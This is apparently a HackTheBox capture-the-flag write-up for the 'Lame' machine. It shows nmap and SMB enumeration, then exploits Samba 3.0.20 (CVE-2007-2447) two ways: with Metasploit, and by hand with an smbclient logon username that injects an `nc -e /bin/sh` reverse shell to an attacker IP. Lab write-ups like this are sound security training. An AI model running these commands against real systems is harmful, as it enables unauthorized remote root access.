# 🏁 HTB — Lame

**Platform:** HackTheBox  
**Category:** Linux, SMB  
**Difficulty:** Easy  
**Date:** 2024-01-01  
**Tags:** `smb` `metasploit` `cve-2007-2447` `linux`

---

## 📋 Description

Lame is a beginner-level machine that involves exploiting a vulnerable version of Samba (SMB) to gain direct root access without needing privilege escalation.

---

## 🔍 Enumeration

### Port Scan

```bash
nmap -sC -sV -oN nmap_lame.txt 10.10.10.3
```

```
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 2.3.4
22/tcp  open  ssh     OpenSSH 4.7p1
139/tcp open  netbios-ssn Samba smbd 3.X
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
```

**Key findings:**
- Port 21: `vsftpd 2.3.4` — known backdoor (CVE-2011-2523), but this instance is patched
- Port 445: `Samba 3.0.20` — **vulnerable to CVE-2007-2447** (username map script)

### SMB Enumeration

```bash
smbclient -L //10.10.10.3 -N
```

```
Sharename    Type   Comment
---------    ----   -------
print$       Disk   Printer Drivers
tmp          Disk   oh noes!
opt          Disk
IPC$         IPC    IPC Service
ADMIN$       IPC    IPC Service
```

---

## 🎯 Exploitation

### CVE-2007-2447 — Samba Username Map Script RCE

Samba 3.0.20 allows shell commands to be injected via the `username` field during authentication using the `MS-RPC` call. The payload is passed through the `/=` syntax.

#### Using Metasploit

```bash
msfconsole -q
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST 10.10.14.X       # your HTB VPN IP
run
```

```
[*] Started reverse TCP handler on 10.10.14.X:4444
[*] Command shell session 1 opened
```

#### Without Metasploit (Manual)

```bash
# The vulnerability injects shell commands via the username field
smbclient //10.10.10.3/tmp -N --option='client min protocol=NT1'

# Inside smbclient — inject reverse shell via username
logon "/=`nohup nc -e /bin/sh 10.10.14.X 4444`"
```

On your listener:
```bash
nc -lvnp 4444
```

---

## 🚩 Flags

We land directly as **root** — no privilege escalation needed!

```bash
whoami
# root

cat /home/makis/user.txt
# 69454a93[...]

cat /root/root.txt
# 92caac3b[...]
```

---

## 📚 What I Learned

- Always check SMB version — Samba 3.0.20 is notoriously vulnerable
- `CVE-2007-2447` allows unauthenticated RCE via username injection
- Metasploit is fast, but understanding the manual exploit deepens knowledge
- `nmap -sC -sV` is always the first step — version detection is everything

---

## 🔗 References

- [CVE-2007-2447 Details](https://www.cve.org/CVERecord?id=CVE-2007-2447)
- [Samba usermap_script — Rapid7](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/)
- [HackTheBox — Lame official writeup](https://app.hackthebox.com/machines/Lame)
